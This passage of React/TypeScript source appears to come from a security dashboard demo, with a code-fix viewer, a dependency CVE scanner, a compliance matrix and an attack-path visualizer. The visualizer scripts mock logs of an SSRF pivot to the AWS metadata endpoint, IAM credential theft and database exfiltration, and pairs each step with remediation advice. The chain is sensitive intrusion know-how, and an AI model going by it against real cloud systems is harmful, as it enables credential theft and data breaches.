                className={`w-full text-left flex items-center justify-between px-2 py-1.5 rounded transition-colors ${
                  selectedFile === "config/db.js" ? "bg-accent/15 text-accent font-semibold" : "text-ink-2 hover:bg-elevated/20"
                }`}
              >
                <div className="flex items-center gap-1.5 truncate">
                  <File size={12} className={selectedFile === "config/db.js" ? "text-accent" : "text-ink-3"} />
                  <span className="truncate">db.js</span>
                </div>
                {!fixedState["config/db.js"] && (
                  <span className="w-1.5 h-1.5 rounded-full bg-critical shrink-0" />
                )}
              </button>
            </div>
          </div>

          {/* Root directory file */}
          <div className="pt-2">
            <button
              onClick={() => { setSelectedFile("package.json"); setHoveredLine(null); }}
              className={`w-full text-left flex items-center justify-between px-2 py-1.5 rounded transition-colors ${
                selectedFile === "package.json" ? "bg-accent/15 text-accent font-semibold" : "text-ink-2 hover:bg-elevated/20"
              }`}
            >
              <div className="flex items-center gap-1.5 truncate">
                <File size={12} className={selectedFile === "package.json" ? "text-accent" : "text-ink-3"} />
                <span className="truncate font-medium">package.json</span>
              </div>
              {!fixedState["package.json"] && (
                <span className="w-1.5 h-1.5 rounded-full bg-critical shrink-0" />
              )}
            </button>
          </div>
        </div>
      </div>

      {/* Editor & Annotations Pane (Right 2/3) */}
      <div className="flex-1 flex flex-col min-h-0 bg-[#07090f]">
        {/* Editor Tab bar Controls */}
        <div className="px-5 py-2 border-b border-border bg-[#0b0e16] flex items-center justify-between shrink-0">
          <div className="flex items-center gap-2">
            <FileCode size={13} className="text-accent" />
            <span className="text-ink text-xs font-mono font-semibold">{currentFile.path}</span>
            {isFileFixed && (
              <span className="inline-flex items-center gap-1 px-1.5 py-0.5 rounded bg-emerald/10 border border-emerald/20 text-emerald text-[9px] font-bold">
                <Check size={8} /> FIXED
              </span>
            )}
          </div>
          <div className="flex items-center gap-3">
            <div className="flex bg-canvas border border-border rounded p-0.5 gap-0.5">
              <button
                onClick={() => setViewMode("code")}
                className={`px-2.5 py-1 rounded text-[10px] font-semibold transition-colors ${
                  viewMode === "code" ? "bg-accent text-white" : "text-ink-3 hover:text-ink-2"
                }`}
              >
                Code View
              </button>
              <button
                onClick={() => setViewMode("diff")}
                className={`px-2.5 py-1 rounded text-[10px] font-semibold transition-colors ${
                  viewMode === "diff" ? "bg-accent text-white" : "text-ink-3 hover:text-ink-2"
                }`}
              >
                Git Diff Fix
              </button>
            </div>
            {isFileFixed ? (
              <button
                onClick={handleReset}
                className="flex items-center gap-1.5 px-3 py-1 bg-elevated border border-border hover:border-border-hi rounded text-ink text-[10px] font-semibold transition-colors"
              >
                <RefreshCw size={10} /> Reset
              </button>
            ) : (
              <button
                onClick={handleApplyFix}
                className="flex items-center gap-1.5 px-3 py-1 bg-emerald text-white rounded text-[10px] font-semibold hover:bg-emerald/90 transition-colors shadow shadow-emerald/20"
              >
                <GitBranch size={10} /> Auto-Fix Code
              </button>
            )}
          </div>
        </div>

        {/* IDE Viewports */}
        <div className="flex-1 overflow-auto relative p-4 font-mono text-[11px] leading-relaxed select-text">
          {viewMode === "code" ? (
            <div className="relative min-w-full">
              {lines.map((lineContent, index) => {
                const lineNum = index + 1
                const issue = !isFileFixed ? currentFile.issues.find(iss => iss.line === lineNum) : null
                const isHovered = hoveredLine === lineNum

                return (
                  <div
                    key={index}
                    onMouseEnter={() => issue && setHoveredLine(lineNum)}
                    onMouseLeave={() => setHoveredLine(null)}
                    className={`flex items-start min-w-full relative transition-colors ${
                      issue ? "bg-critical/5 hover:bg-critical/10" : "hover:bg-elevated/5"
                    }`}
                  >
                    {/* Gutter Gutter */}
                    <div className="w-9 select-none text-right pr-3 text-ink-3/50 border-r border-border/20 shrink-0 font-mono">
                      {issue ? (
                        <span className="inline-block text-critical font-bold text-center w-full">!</span>
                      ) : (
                        lineNum
                      )}
                    </div>
                    {/* Line Content */}
                    <div className="pl-4 whitespace-pre relative flex-1">
                      {issue ? (
                        <span className="border-b border-dashed border-critical text-critical/90 font-semibold cursor-help">
                          {lineContent}
                        </span>
                      ) : (
                        <span className={isFileFixed ? "text-emerald/80" : "text-ink-2"}>{lineContent}</span>
                      )}

                      {/* Tooltip Hover Overlay */}
                      {issue && isHovered && (
                        <div className="absolute left-4 top-full mt-2 w-[420px] bg-elevated border border-border rounded-lg p-4 shadow-xl z-50 text-sans font-sans">
                          <div className="flex items-center justify-between mb-2">
                            <span className="text-critical text-xs font-semibold uppercase tracking-wider flex items-center gap-1">
                              <AlertTriangle size={12} /> {issue.type}
                            </span>
                            <span className="text-[9px] font-mono bg-canvas border border-border text-ink-3 px-1.5 py-0.5 rounded">
                              {issue.cwe}
                            </span>
                          </div>
                          <p className="text-ink text-xs font-medium leading-relaxed mb-3">
                            {issue.message}
                          </p>
                          <div className="border-t border-border/40 pt-2 text-[10px] text-ink-3 space-y-1.5">
                            <span className="text-[9px] uppercase font-bold text-ink-3 tracking-wider block">Remediation Guide:</span>
                            <p className="leading-relaxed text-ink-2">{issue.remediation}</p>
                          </div>
                          <div className="mt-3.5 flex justify-end gap-2">
                            <button
                              onClick={handleApplyFix}
                              className="px-3 py-1.5 bg-emerald text-white rounded text-[10px] font-bold hover:bg-emerald/90 transition-colors shadow shadow-emerald/20"
                            >
                              Apply Quick Fix
                            </button>
                          </div>
                        </div>
                      )}
                    </div>
                  </div>
                )
              })}
            </div>
          ) : (
            /* Diff Comparison View */
            <div className="grid grid-cols-2 gap-4 h-full min-w-[700px]">
              {/* Left pane - Original code (Red deletions) */}
              <div className="border border-border rounded bg-canvas/30 p-3 overflow-auto flex flex-col">
                <span className="text-[9px] uppercase tracking-wider font-semibold text-critical mb-2 block font-sans">
                  Original Code
                </span>
                <div className="flex-1 font-mono text-[10px]">
                  {lines.map((lineContent, index) => {
                    const lineNum = index + 1
                    const isVulnerable = currentFile.issues.some(iss => iss.line === lineNum)
                    return (
                      <div key={index} className={`flex ${isVulnerable ? "bg-critical/10 text-critical" : "text-ink-3"}`}>
                        <span className="w-8 text-right pr-2 text-ink-3/40 select-none border-r border-border/20 mr-2">
                          {lineNum}
                        </span>
                        <span className="whitespace-pre">{lineContent}</span>
                      </div>
                    )
                  })}
                </div>
              </div>

              {/* Right pane - Fixed code (Green additions) */}
              <div className="border border-border rounded bg-canvas/30 p-3 overflow-auto flex flex-col">
                <span className="text-[9px] uppercase tracking-wider font-semibold text-emerald mb-2 block font-sans">
                  Proposed Patch
                </span>
                <div className="flex-1 font-mono text-[10px]">
                  {fixedLines.map((lineContent, index) => {
                    const lineNum = index + 1
                    const isPatched = lineContent.includes("// Fixed:") || lineContent.includes("process.env") || lineContent.includes("Execution disallowed") || lineContent.includes("0.21.2") || lineContent.includes("4.17.21")
                    return (
                      <div key={index} className={`flex ${isPatched ? "bg-emerald/10 text-emerald font-semibold" : "text-ink-2"}`}>
                        <span className="w-8 text-right pr-2 text-ink-3/40 select-none border-r border-border/20 mr-2">
                          {lineNum}
                        </span>
                        <span className="whitespace-pre">{lineContent}</span>
                      </div>
                    )
                  })}
                </div>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  )
}

// ────────────────────────────────────────────────────────
// NEW ATTACK PATH VISUALIZER COMPONENT
// ────────────────────────────────────────────────────────
interface ThreatNode {
  id: string
  label: string
  ip: string
  role: string
  details: string
  status: string
  cves: string
  remediation: string
  x: number
  y: number
  color: string
}

const ATTACK_NODES: Record<string, ThreatNode> = {
  attacker: {
    id: "attacker",
    label: "Attacker Host",
    ip: "194.22.84.1",
    role: "Tor Entrynode Vector",
    details: "Automated scan runner launching payloads from a routing pool (Tor ingress proxy).",
    status: "Active Attacking Ingress",
    cves: "N/A",
    remediation: "Activate Cloudflare Web Application Firewall (WAF) rate limiting and edge IP restrictions.",
    x: 150,
    y: 250,
    color: "#ef4444"
  },
  vulnerability: {
    id: "vulnerability",
    label: "api.acmecorp.com",
    ip: "104.22.3.94",
    role: "SSRF Public Web Server",
    details: "Host vulnerability VLN-0247 (Path Traversal in Export) allows attackers to trigger outbound connection requests.",
    status: "Host Compromised",
    cves: "CVE-2026-0847, CVE-2026-9281",
    remediation: "Restrict filesystem reads via path resolving boundary checks and audit parameter input sanitization.",
    x: 420,
    y: 150,
    color: "#f97316"
  },
  aws_metadata: {
    id: "aws_metadata",
    label: "EC2 Instance Metadata (IMDSv1)",
    ip: "169.254.169.254",
    role: "AWS IAM Token endpoint",
    details: "Attacker pivoted SSRF query to fetch local credentials from the IMDSv1 interface, leaking target AWS IAM tokens.",
    status: "Metadata Pivot Exposed",
    cves: "AWS-IMDSv1-Omission",
    remediation: "Require IMDSv2 (Session Token enforced headers) and set hop-limits to 1 in AWS EC2 instances.",
    x: 690,
    y: 350,
    color: "#f59e0b"
  },
  database: {
    id: "database",
    label: "Staging RDS Database",
    ip: "10.0.84.12",
    role: "RDS Postgres Crown Jewel",
    details: "Compromised database instance. Leaked AWS credentials were used to authenticate directly to backend staging files.",
    status: "Target Exfiltrated",
    cves: "N/A",
    remediation: "Deactivate leaked credentials immediately, enforce network Isolation for the DB VPC security group.",
    x: 950,
    y: 250,
    color: "#ef4444"
  }
}

function ThreatPathVisualizer() {
  const [selectedNode, setSelectedNode] = useState<string>("vulnerability")
  const [mitigated, setMitigated] = useState<Record<string, boolean>>({})
  const [testing, setTesting] = useState<string | null>(null)

  // Simulation States
  const [simPlaying, setSimPlaying] = useState(false)
  const [simStep, setSimStep] = useState(0)
  const [simLogs, setSimLogs] = useState<string[]>([])
  const consoleRef = useRef<HTMLDivElement>(null)

  const activeNode = ATTACK_NODES[selectedNode]

  const handleMitigate = (nodeId: string) => {
    setTesting(nodeId)
    setTimeout(() => {
      setTesting(null)
      setMitigated(prev => ({ ...prev, [nodeId]: true }))
    }, 2000)
  }

  useEffect(() => {
    if (!simPlaying) return

    let timer: any
    if (simStep === 0) {
      setSimStep(1)
      setSelectedNode("vulnerability")
      setSimLogs([
        "14:26:02 [INGRESS] Tor egress proxy 194.22.84.1 initialized.",
        "14:26:03 [EXPLOIT] Injecting SSRF payload into /export?file= parameter.",
        "14:26:04 [STATUS] Target api.acmecorp.com returned HTTP 500. Connection opened."
      ])
    } else if (simStep === 1) {
      timer = setTimeout(() => {
        setSimStep(2)
        setSelectedNode("aws_metadata")
        setSimLogs(prev => [
          ...prev,
          "14:26:05 [PIVOT] Requesting internal AWS IMDSv1 (169.254.169.254).",
          "14:26:06 [EXPLOIT] Requesting IAM session token for role: WebserverRole.",
          "14:26:07 [STATUS] AWS AccessKeyId leaked: ASIAXXXXXX..."
        ])
      }, 2500)
    } else if (simStep === 2) {
      timer = setTimeout(() => {
        setSimStep(3)
        setSelectedNode("database")
        setSimLogs(prev => [
          ...prev,
          "14:26:08 [PIVOT] Connecting to RDS Postgres Database (10.0.84.12) using credentials.",
          "14:26:09 [EXPLOIT] Querying staging database user profiles and credentials.",
          "14:26:10 [SUCCESS] 4,821 customer rows exfiltrated. DB Compromise Complete."
        ])
      }, 2500)
    } else if (simStep === 3) {
      timer = setTimeout(() => {
        setSimStep(4)
        setSimPlaying(false)
        setSimLogs(prev => [
          ...prev,
          "14:26:11 [REPORT] Lateral Threat Path Simulation Finished. Vulnerabilities validated."
        ])
      }, 2500)
    }

    return () => clearTimeout(timer)
  }, [simPlaying, simStep])

  useEffect(() => {
    if (consoleRef.current) {
      consoleRef.current.scrollTop = consoleRef.current.scrollHeight
    }
  }, [simLogs])

  return (
    <div className="flex h-full min-h-0 divide-x divide-border">
      {/* Node Graph Display Pane (2/3 width) */}
      <div className="flex-1 flex flex-col bg-[#07090f] relative overflow-hidden p-6 min-h-0">
        <div className="mb-4 relative z-10 shrink-0 flex justify-between items-center">
          <div>
            <h2 className="text-ink text-xs font-semibold uppercase tracking-wider flex items-center gap-1.5">
              <Activity size={12} className="text-critical animate-pulse" /> Lateral Threat Path Visualizer
            </h2>
            <p className="text-ink-3 text-[11px] mt-0.5">
              Graph analysis showing network hops and pivot points exploited to exfiltrate database records.
            </p>
          </div>
          <div className="flex items-center gap-2">
            {!simPlaying && simStep === 0 ? (
              <button
                onClick={() => setSimPlaying(true)}
                className="flex items-center gap-1.5 px-3 py-1 bg-accent hover:bg-accent/90 text-white rounded text-[11px] font-semibold transition-colors shadow shadow-accent/20"
              >
                <span>Simulate Threat Vector</span>
              </button>
            ) : simPlaying ? (
              <button
                onClick={() => {
                  setSimPlaying(false)
                  setSimStep(0)
                  setSimLogs([])
                }}
                className="flex items-center gap-1.5 px-3 py-1 bg-critical hover:bg-critical/90 text-white rounded text-[11px] font-semibold transition-colors"
              >
                <span>Stop Simulation</span>
              </button>
            ) : (
              <button
                onClick={() => {
                  setSimStep(0)
                  setSimLogs([])
                  setSimPlaying(true)
                }}
                className="flex items-center gap-1.5 px-3 py-1 bg-accent hover:bg-accent/90 text-white rounded text-[11px] font-semibold transition-colors"
              >
                <span>Replay Simulation</span>
              </button>
            )}
          </div>
        </div>

        {/* Node Link SVG Canvas */}
        <div className="flex-1 relative border border-border/40 rounded-xl bg-canvas/20 overflow-hidden flex items-center justify-center">
          {/* Animated SVG Connections */}
          <svg className="absolute inset-0 w-full h-full pointer-events-none select-none z-0">
            <defs>
              <linearGradient id="glowGrad" x1="0%" y1="0%" x2="100%" y2="100%">
                <stop offset="0%" stopColor="#ef4444" stopOpacity="0.4" />
                <stop offset="50%" stopColor="#5a57ff" stopOpacity="0.4" />
                <stop offset="100%" stopColor="#10b981" stopOpacity="0.4" />
              </linearGradient>
            </defs>

            {/* Ingress to Web Server */}
            <path
              d="M 150 250 Q 285 200 420 150"
              fill="none"
              stroke={mitigated["vulnerability"] ? "#10b981" : "#ef4444"}
              strokeWidth="2"
              className={mitigated["vulnerability"] ? "" : "animate-dash"}
              strokeDasharray="6, 6"
              style={{ strokeDashoffset: 100 }}
            />

            {/* Web Server to AWS Metadata */}
            <path
              d="M 420 150 Q 555 250 690 350"
              fill="none"
              stroke={mitigated["aws_metadata"] ? "#10b981" : "#f97316"}
              strokeWidth="2"
              className={mitigated["aws_metadata"] ? "" : "animate-dash"}
              strokeDasharray="6, 6"
              style={{ strokeDashoffset: 100 }}
            />

            {/* AWS Metadata to RDS Database */}
            <path
              d="M 690 350 Q 820 300 950 250"
              fill="none"
              stroke={mitigated["database"] ? "#10b981" : "#ef4444"}
              strokeWidth="2"
              className={mitigated["database"] ? "" : "animate-dash"}
              strokeDasharray="6, 6"
              style={{ strokeDashoffset: 100 }}
            />

            {/* Simulation Motion Particles */}
            {simPlaying && simStep === 1 && (
              <circle r="4" fill="#ef4444" className="shadow">
                <animateMotion dur="2.5s" repeatCount="indefinite" path="M 150 250 Q 285 200 420 150" />
              </circle>
            )}
            {simPlaying && simStep === 2 && (
              <circle r="4" fill="#f97316" className="shadow">
                <animateMotion dur="2.5s" repeatCount="indefinite" path="M 420 150 Q 555 250 690 350" />
              </circle>
            )}
            {simPlaying && simStep === 3 && (
              <circle r="4" fill="#ef4444" className="shadow">
                <animateMotion dur="2.5s" repeatCount="indefinite" path="M 690 350 Q 820 300 950 250" />
              </circle>
            )}
          </svg>

          {/* Node Overlay Points */}
          <div className="absolute inset-0 z-10 pointer-events-none">
            {Object.values(ATTACK_NODES).map((node) => {
              const isSelected = selectedNode === node.id
              const isMitigated = mitigated[node.id] || false
              const color = isMitigated ? "#10b981" : node.color

               return (
                <button
                  key={node.id}
                  onClick={() => setSelectedNode(node.id)}
                  style={{ 
                    left: `${node.x - 36}px`, 
                    top: `${node.y - 36}px`,
                    color: color,
                    animationDelay: node.id === "attacker" ? "0s" : node.id === "vulnerability" ? "1.5s" : node.id === "aws_metadata" ? "3.5s" : "5s"
                  }}
                  className="absolute pointer-events-auto w-[72px] h-[72px] rounded-full flex flex-col items-center justify-center transition-all duration-300 group focus:outline-none node-3d animate-float-3d"
                >
                  {/* Glowing outer ring */}
                  <div
                    style={{ borderColor: isSelected ? color : "transparent", boxShadow: isSelected ? `0 0 16px ${color}44` : "" }}
                    className="absolute inset-0 rounded-full border-2 border-dashed border-border group-hover:border-border-hi transition-all"
                  />
                  {/* Inner bubble */}
                  <div
                    style={{ backgroundColor: `${color}15`, borderColor: color }}
                    className="w-11 h-11 rounded-full border flex items-center justify-center text-[10px] font-mono font-bold text-ink transition-transform group-hover:scale-105"
                  >
                    {node.id === "attacker" && "INT"}
                    {node.id === "vulnerability" && "WEB"}
                    {node.id === "aws_metadata" && "AWS"}
                    {node.id === "database" && "DB"}
                  </div>
                  <span className="text-[9px] font-semibold text-ink-2 mt-1.5 truncate max-w-[80px] bg-canvas/80 px-1 rounded">
                    {node.id === "attacker" ? "Tor Ingress" : node.id === "vulnerability" ? "api.acme" : node.id === "aws_metadata" ? "IMDSv1" : "RDS Staging"}
                  </span>
                </button>
              )
            })}
          </div>

          {/* Simulation Log Console Overlay */}
          {simStep > 0 && (
            <div 
              ref={consoleRef}
              className="absolute bottom-3 left-3 right-3 bg-[#080b11]/90 border border-border/80 rounded-lg p-3 max-h-[120px] overflow-y-auto z-20 font-mono text-[9px] text-ink-2 space-y-1"
            >
              <div className="flex justify-between items-center text-ink-3 border-b border-border/40 pb-1 mb-1 font-sans select-none">
                <span className="font-semibold uppercase tracking-wider">Simulation Console Stream</span>
                <span className="text-[8px] animate-pulse text-critical">● ACTIVE LOG</span>
              </div>
              {simLogs.map((log, idx) => (
                <div key={idx} className={log.includes("[SUCCESS]") ? "text-emerald" : log.includes("[EXPLOIT]") ? "text-accent" : log.includes("[STATUS]") ? "text-yellow" : "text-ink-2"}>
                  {log}
                </div>
              ))}
            </div>
          )}

          {/* Canvas Tech background Grid with Scanlines */}
          <div className="absolute inset-0 hologram-panel pointer-events-none" />
        </div>
      </div>

      {/* Node Inspector Telemetry Panel (1/3 width) */}
      <div className="w-[380px] shrink-0 p-5 space-y-4 overflow-y-auto bg-card flex flex-col min-h-0">
        <div className="border-b border-border pb-3">
          <div className="flex items-center justify-between mb-1.5">
            <span className="text-[9px] font-mono uppercase tracking-widest text-ink-3 font-semibold">
              Host Pivot Telemetry
            </span>
            <span
              style={{
                color: mitigated[activeNode.id] ? "#10b981" : activeNode.color,
                backgroundColor: `${mitigated[activeNode.id] ? "#10b981" : activeNode.color}12`,
                borderColor: `${mitigated[activeNode.id] ? "#10b981" : activeNode.color}25`
              }}
              className="px-1.5 py-0.5 rounded border text-[9px] font-bold tracking-wide uppercase font-mono"
            >
              {mitigated[activeNode.id] ? "MITIGATED" : activeNode.status}
            </span>
          </div>
          <h3 className="text-ink text-sm font-bold">{activeNode.label}</h3>
        </div>

        <div className="space-y-3.5 flex-1 min-h-0 text-xs">
          {[
            { label: "Vulnerability Role", value: activeNode.role },
            { label: "Resolved IP Address", value: activeNode.ip },
            { label: "CVE Matrix References", value: activeNode.cves }
          ].map((item) => (
            <div key={item.label} className="bg-canvas border border-border rounded p-3">
              <span className="text-ink-3 text-[9px] uppercase tracking-wider block mb-1 font-semibold">{item.label}</span>
              <span className="text-ink font-mono font-medium">{item.value}</span>
            </div>
          ))}

          <div className="bg-canvas border border-border rounded p-3 space-y-1.5">
            <span className="text-ink-3 text-[9px] uppercase tracking-wider block font-semibold">Security Exploit Details</span>
            <p className="text-ink-2 leading-relaxed">{activeNode.details}</p>
          </div>

          <div className="bg-canvas border border-border rounded p-3 space-y-1.5">
            <span className="text-ink-3 text-[9px] uppercase tracking-wider block font-semibold">Remediation Guidelines</span>
            <p className="text-ink-2 leading-relaxed font-sans">{activeNode.remediation}</p>
          </div>
        </div>

        <div className="pt-4 border-t border-border shrink-0">
          {mitigated[activeNode.id] ? (
            <div className="w-full flex items-center justify-center gap-1.5 py-2.5 bg-emerald/10 border border-emerald/20 text-emerald rounded text-xs font-semibold">
              <Check size={12} /> Mitigated Security Gaps Enforced
            </div>
          ) : (
            <button
              onClick={() => handleMitigate(activeNode.id)}
              disabled={testing !== null}
              className="w-full flex items-center justify-center gap-1.5 py-2.5 bg-accent text-white rounded text-xs font-semibold hover:bg-accent/90 transition-colors shadow shadow-accent/20 disabled:opacity-50"
            >
              {testing === activeNode.id ? (
                <>
                  <Loader2 size={12} className="animate-spin" />
                  <span>Verifying Configurations...</span>
                </>
              ) : (
                <>
                  <Shield size={12} />
                  <span>Enforce Path Remediation</span>
                </>
              )}
            </button>
          )}
        </div>
      </div>
    </div>
  )
}

// ────────────────────────────────────────────────────────
// SCA DEPENDENCY SCANNER COMPONENT
// ────────────────────────────────────────────────────────
const DEPENDENCIES = [
  { name: "lodash", current: "4.17.15", advisory: "Prototype Pollution (CVE-2020-8203)", severity: "Critical", fix: "Upgrade to >= 4.17.21" },
  { name: "minimist", current: "1.2.0", advisory: "Prototype Pollution (CVE-2021-44906)", severity: "High", fix: "Upgrade to >= 1.2.6" },
  { name: "axios", current: "0.21.1", advisory: "Server-Side Request Forgery (SSRF) (CVE-2021-3749)", severity: "High", fix: "Upgrade to >= 0.21.2" },
  { name: "express", current: "4.15.2", advisory: "Open Redirect / Header Injection", severity: "Medium", fix: "Upgrade to >= 4.17.2" },
  { name: "semver", current: "5.7.1", advisory: "Regular Expression Denial of Service (ReDoS)", severity: "Low", fix: "Upgrade to >= 5.7.2" },
]

function ScaScanner() {
  const [scanning, setScanning] = useState(false)
  const [scanned, setScanned] = useState(false)
  const [depsList, setDepsList] = useState<any[]>([])

  const handleScanSca = () => {
    setScanning(true)
    setTimeout(() => {
      setScanning(false)
      setScanned(true)
      setDepsList(DEPENDENCIES)
    }, 1200)
  }

  return (
    <div className="flex h-full min-h-0 overflow-hidden divide-x divide-border">
      {/* Configuration & Action (1/3 width) */}
      <div className="w-[300px] shrink-0 p-5 space-y-4 overflow-y-auto bg-card">
        <div className="flex items-center gap-2 mb-1">
          <Boxes size={14} className="text-accent" />
          <p className="text-ink text-sm font-semibold">Dependency Audit (SCA)</p>
        </div>
        <p className="text-ink-3 text-xs leading-relaxed">
          Analyze lockfiles (`package-lock.json`, `pnpm-lock.yaml`) for open-source library vulnerabilities (CVE databases).
        </p>

        <div className="border border-dashed border-border rounded-lg p-5 text-center cursor-pointer bg-canvas/30 hover:border-accent transition-colors group">
          <FileCode size={20} className="text-ink-3 group-hover:text-accent mx-auto mb-2" />
          <span className="text-ink text-xs block font-semibold">Upload npm lockfile</span>
          <span className="text-ink-3 text-[10px] block mt-1">JSON/YAML structure</span>
        </div>

        <button
          onClick={handleScanSca}
          disabled={scanning}
          className="w-full flex items-center justify-center gap-2 py-2 bg-accent text-white rounded text-xs font-semibold hover:bg-accent/90 shadow shadow-accent/20 disabled:opacity-50"
        >
          {scanning ? <Loader2 size={12} className="animate-spin" /> : <Shield size={12} />}
          <span>Audit Project Lockfile</span>
        </button>
      </div>

      {/* Results Table (2/3 width) */}
      <div className="flex-1 flex flex-col bg-canvas overflow-hidden">
        <div className="px-5 py-3 border-b border-border bg-panel/30 flex items-center justify-between shrink-0">
          <span className="text-ink text-sm font-semibold">Library Vulnerabilities</span>
          {scanned && <span className="text-critical text-xs font-mono font-semibold">{depsList.length} advisories</span>}
        </div>

        <div className="flex-1 overflow-auto">
          {!scanned ? (
            <div className="h-full flex items-center justify-center text-ink-3 text-xs italic">
              Click "Audit Project Lockfile" to fetch library advisories.
            </div>
          ) : (
            <table className="w-full border-collapse">
              <thead className="sticky top-0 bg-[#0c1018] border-b border-border text-[10px] font-semibold text-ink-3 uppercase font-mono">
                <tr>
                  <th className="px-4 py-2.5 text-left pl-5">Package</th>
                  <th className="px-4 py-2.5 text-left w-20">Severity</th>
                  <th className="px-4 py-2.5 text-left">Security Advisory</th>
                  <th className="px-4 py-2.5 text-left w-24">Current Ver</th>
                  <th className="px-4 py-2.5 text-left">Upgrade Path</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-border/60">
                {depsList.map((dep) => {
                  const sev = SEV_CONFIG[dep.severity]
                  return (
                    <tr key={dep.name} className="text-xs hover:bg-elevated/20 transition-colors font-mono">
                      <td className="px-4 py-3 pl-5 font-semibold text-ink">{dep.name}</td>
                      <td className="px-4 py-3">
                        <span className={`px-1.5 py-0.5 rounded border text-[9px] font-bold tracking-wide uppercase ${sev.text} ${sev.bg} ${sev.border}`}>
                          {dep.severity}
                        </span>
                      </td>
                      <td className="px-4 py-3 text-ink-2 font-sans">{dep.advisory}</td>
                      <td className="px-4 py-3 text-ink-3">{dep.current}</td>
                      <td className="px-4 py-3 text-emerald font-semibold">{dep.fix}</td>
                    </tr>
                  )
                })}
              </tbody>
            </table>
          )}
        </div>
      </div>
    </div>
  )
}

function DrawerSection({ title, icon, children }: { title: string; icon: React.ReactNode; children: React.ReactNode }) {
  const [open, setOpen] = useState(true)
  return (
    <div className="border border-border/60 rounded-lg overflow-hidden bg-canvas/30">
      <button
        onClick={() => setOpen(!open)}
        className="w-full flex items-center justify-between px-4 py-2.5 bg-[#0b0f17]/30 hover:bg-[#0b0f17]/50 text-xs font-semibold text-ink-2 select-none border-b border-border/40"
      >
        <div className="flex items-center gap-2">
          <span className="text-accent shrink-0">{icon}</span>
          <span>{title}</span>
        </div>
        <ChevronDown size={12} className={`text-ink-3 transition-transform ${open ? "" : "-rotate-90"}`} />
      </button>
      {open && <div className="p-4 bg-canvas/10">{children}</div>}
    </div>
  )
}

const COMPLIANCE_STANDARDS = [
  {
    id: "soc2",
    name: "SOC 2 Type II",
    desc: "Trust Services Criteria for Security, Availability, Processing Integrity, and Confidentiality.",
    score: 75,
    controls: [
      { id: "CC6.1", title: "Logical Access Controls", status: "Failing", desc: "Access to system credentials and configurations must be restricted to authorized users.", finding: "VLN-0245" },
      { id: "CC6.3", title: "System Boundary Monitoring", status: "Failing", desc: "Authorized access boundary points must be scanned for potential SQL injection or data manipulation vectors.", finding: "VLN-0246" },
      { id: "CC6.8", title: "Transmission Security", status: "Compliant", desc: "Data transmission must be encrypted using secure TLS tunnels." },
    ]
  },
  {
    id: "iso",
    name: "ISO/IEC 27001",
    desc: "Information Security Management System (ISMS) framework controls.",
    score: 80,
    controls: [
      { id: "A.12.6.1", title: "Technical Vulnerability Management", status: "Failing", desc: "Organizations must obtain timely information about technical vulnerabilities and take appropriate measures.", finding: "VLN-0247" },
      { id: "A.14.2.8", title: "System Security Testing", status: "Compliant", desc: "Development security testing must align with organizational security standards." },
    ]
  },
  {
    id: "owasp",
    name: "OWASP Top 10 (2021)",
    desc: "Top critical security risks for web applications.",
    score: 60,
    controls: [
      { id: "A01:2021", title: "Broken Access Control", status: "Failing", desc: "Enforce restriction policies to prevent unauthorized data access.", finding: "VLN-0245" },
      { id: "A03:2021", title: "Injection", status: "Failing", desc: "Prevent untrusted inputs from running database queries directly.", finding: "VLN-0246" },
      { id: "A05:2021", title: "Security Misconfiguration", status: "Failing", desc: "Ensure secure configuration defaults across all platforms.", finding: "VLN-0244" },
    ]
  }
]

function ComplianceMatrix({
  setActiveTab,
  setSelected,
}: {
  setActiveTab: (tab: "findings" | "sast" | "sca" | "threat-path" | "compliance") => void
  setSelected: (finding: any) => void
}) {
  const [selectedStandard, setSelectedStandard] = useState("soc2")
  const [expandedControl, setExpandedControl] = useState<string | null>(null)

  const activeStd = COMPLIANCE_STANDARDS.find(s => s.id === selectedStandard) || COMPLIANCE_STANDARDS[0]

  const handleLinkToFinding = (findingId: string) => {
    const targetFinding = ALL_FINDINGS.find(f => f.id === findingId)
    if (targetFinding) {
      setSelected(targetFinding)
      setActiveTab("findings")
    }
  }

  return (
    <div className="flex h-full min-h-0 overflow-hidden divide-x divide-border">
      {/* Left Selection Column (1/3 width) */}
      <div className="w-[320px] shrink-0 p-5 space-y-4 overflow-y-auto bg-card">
        <div className="flex items-center gap-2 mb-1">
          <FolderOpen size={14} className="text-accent" />
          <p className="text-ink text-sm font-semibold">Compliance Control Matrices</p>
        </div>
        <p className="text-ink-3 text-xs leading-relaxed">
          Monitor your alignment with industry security standards and automatically track failing compliance controls linked to active vulnerabilities.
        </p>

        <div className="space-y-3 pt-2">
          {COMPLIANCE_STANDARDS.map((std) => {
            const isActive = std.id === selectedStandard
            const color = std.score >= 80 ? "stroke-emerald" : std.score >= 70 ? "stroke-yellow" : "stroke-critical"
            return (
              <button
                key={std.id}
                onClick={() => {
                  setSelectedStandard(std.id)
                  setExpandedControl(null)
                }}
                className={`w-full text-left p-4 rounded-lg border transition-all flex items-center gap-4 ${
                  isActive 
                    ? "bg-elevated border-accent shadow-md shadow-accent/5" 
                    : "bg-canvas/30 border-border hover:border-border-hi"
                }`}
              >
                {/* SVG Radial Gauge */}
                <div className="relative w-12 h-12 shrink-0">
                  <svg className="w-full h-full transform -rotate-90" viewBox="0 0 36 36">
                    <path
                      className="stroke-border/40"
                      strokeWidth="3.5"
                      fill="none"
                      d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831"
                    />
                    <path
                      className={color}
                      strokeWidth="3.5"
                      strokeDasharray={`${std.score}, 100`}
                      strokeLinecap="round"
                      fill="none"
                      d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831"
                    />
                  </svg>
                  <div className="absolute inset-0 flex items-center justify-center text-[10px] font-mono font-bold text-ink">
                    {std.score}%
                  </div>
                </div>
                <div className="min-w-0">
                  <h4 className="text-xs font-bold text-ink truncate">{std.name}</h4>
                  <p className="text-[10px] text-ink-3 truncate mt-0.5">{std.desc}</p>
                </div>
              </button>
            )
          })}
        </div>
      </div>

      {/* Right Details Column (2/3 width) */}
      <div className="flex-1 flex flex-col bg-canvas overflow-hidden">
        <div className="px-5 py-3.5 border-b border-border bg-panel/30 flex items-center justify-between shrink-0">
          <div>
            <span className="text-ink text-sm font-semibold">{activeStd.name} Controls Checklists</span>
            <p className="text-[10px] text-ink-3 mt-0.5">{activeStd.desc}</p>
          </div>
        </div>

        <div className="flex-1 overflow-y-auto p-5 space-y-3">
